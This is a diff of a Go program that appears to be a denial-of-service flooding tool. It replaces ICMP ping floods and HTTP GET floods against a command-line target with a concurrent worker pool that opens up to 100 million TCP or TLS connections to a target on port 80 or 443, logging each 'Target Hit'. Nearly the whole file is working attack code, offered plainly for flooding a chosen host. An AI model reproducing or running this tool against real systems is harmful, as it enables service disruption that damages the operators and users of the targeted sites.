@@ -1,118 +1,117 @@
 package main
 
 import (
-	"fmt"
-	"net/http"
 	"os"
-	"strconv"
-	"sync"
-	"strings"
-	"github.com/sparrc/go-ping"
+	"log"
+	str "strconv"
+	"net"
+	"fmt"
+	"crypto/tls"
 )
 
 var (
-	wg sync.WaitGroup
-	mutex sync.Mutex
-	successfulHits int
-	missedHits int
+	workers int
+	target string
+	port int
 )
 
 const (
-	threadLimit = 5000
-	icmp = "icmp"
-	httpGet = "httpget"
+	jobCount = 100_000_000  		// AMOUNT of requests to send. 
 )
 
-func main() {
-	method, target, threads := parseArgs()
-
-	fmt.Println("Press CTRL + C to quit")
-	fmt.Println()
-	fmt.Println("Attacking " + target + "...")
-	
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-
-		switch method {
-			case icmp:
-				go icmpFlood(target, &wg)
-			case httpGet:
-				go httpGetFlood(target, &wg)
-			default: 
-				fmt.Println("Method chosen not available")
-				os.Exit(1)
-		}
-	}
-	wg.Wait()
+func init() {
+	parseArgs(&workers, &target, &port)
 }
 
-func parseArgs() (method string, target string, numbOfThreads int) {
-	if len(os.Args) != 4 {
-		fmt.Println("Error: Wrong arguements passed")
-		fmt.Println()
-		fmt.Println(`Usage: <method> <target> <threads>`)
+func httpAttackWorker(workerID int, jobs chan int, result chan int) {
+	switch port {
+		case 80:
+			for job := range jobs { 						
+				address := target + ":" + str.Itoa(port)
+				_, err := net.Dial("tcp", address)
 		
-		fmt.Println(`Example: www.mysite.com 100`)
-		fmt.Println()
+				if err != nil {
+					log.Printf("Worker: %d - Bad response from target! - %d \n", workerID, job)
+					result <- 0
+					continue
+				}
+		
+				log.Printf("Worker: %d - Job:%d - Target Hit! \n", workerID, job)
+				result <- 1 
+			}
+		case 443:
+			config := &tls.Config{ InsecureSkipVerify: true, }
 
+			for job := range jobs {
+				address := target + ":" + str.Itoa(port)
+				_, err := tls.Dial("tcp", address, config)	
+
+				if err != nil {
+					log.Printf("Worker: %d - Bad response from target! - %d \n", workerID, job)
+					result <- 0
+					continue
+				}
+		
+				log.Printf("Worker: %d - Job:%d - Target Hit! \n", workerID, job)
+				result <- 1 
+			}
+		default:
+			fmt.Println("Invalid port number entered.")
+			os.Exit(1)
+	}
+}
+
+func parseArgs(workers *int, target *string, port *int) {
+	if len(os.Args) < 4 {
+		log.Println("Not enough parameters passed. ")
+		fmt.Println("Usage: go run main.go <threads> <target> <port>")
 		os.Exit(1)
 	}
-	// Parsed args
-	method = strings.ToLower(os.Args[1])
-	target = os.Args[2]
-	numbOfThreads, _ = strconv.Atoi(os.Args[3])
 
-	if (areNumberOfThreadsValid(numbOfThreads)) == false {
-		fmt.Println("Error: The number of threads you enter exceeds the limit; ", threadLimit)
+	if _, err := str.Atoi(os.Args[1]); err != nil {
+		log.Println("Thread must be a number")
+		fmt.Println("Usage: go run main.go <threads> <target> <port>")
 		os.Exit(1)
 	}
-	return method, target, numbOfThreads
-}
 
-func areNumberOfThreadsValid(threads int) bool {
-	threads = int(threads)
-
-	if threads > threadLimit {
-		return false
-	}
-	return true
-}
-
-func httpGetFlood(target string, wg *sync.WaitGroup) {
-	for {
-		_, err := http.Get(target)
-
-		if err != nil {				 // Server could be down as failed to get a response from host. 
-			mutex.Lock()
-			missedHits++
-			fmt.Print(missedHits, " missed hits \r")
-			mutex.Unlock()
-		}
-
-		{
-			mutex.Lock()
-			successfulHits++
-			fmt.Print(successfulHits, " direct hits \r")
-			mutex.Unlock()
-		}
-	}
-	wg.Done()
-}
-
-func icmpFlood(target string, wg *sync.WaitGroup) {
-	pinger, err := ping.NewPinger(target)
-
-	if err != nil {
-		fmt.Println("Failed to get a response from host")
+	if _, err := str.Atoi(os.Args[3]); err != nil {
+		log.Println("Port must be a number")
+		fmt.Println("Usage: go run main.go <threads> <target> <port>")
+		os.Exit(1)
 	}
 
-	pinger.Count = 10000 					// Packets to send
-	pinger.Size = 127						// 127 bytes in size
-	pinger.Run()         					// Blocks until complete
+	// On succesful conversion, set worker count
+	*workers,_	= str.Atoi(os.Args[1])
+	*target 	= os.Args[2]
+    *port,_ 	= str.Atoi(os.Args[3])
+}
 
-	stats := pinger.Statistics()
-	fmt.Print("%d sent - %d packet loss", stats.PacketsSent, stats.PacketLoss)
+func sendJobsToWorkers(jobCount int, jobs chan int){
+	for j := 0; j <= jobCount; j++ {
+		jobs <- j
+	} 
+	log.Println("Jobs placed in buff3r.")
+	close(jobs) 	
+}
 
-	wg.Done() 								// Decrement thread counter once complete
-	fmt.Println("Ping Complete.")
+func startWorkers(workers int, jobs, results chan int) {
+	for  w := 1; w < workers; w++ { 			
+		go httpAttackWorker(w, jobs, results)
+	} 
+}
+
+func main() {
+	jobs 	:= make(chan int, jobCount) 
+	results := make(chan int, jobCount)  				
+
+	go startWorkers(workers, jobs, results)
+    go sendJobsToWorkers(jobCount, jobs)
+	
+	// - Blocks till jobs finished. 
+	for r := 1; r < jobCount; r++ {
+		<-results	
+	} 
+	
+	close(results)
+	log.Println("Finished attacking. Workers put to sleep... ")
 }
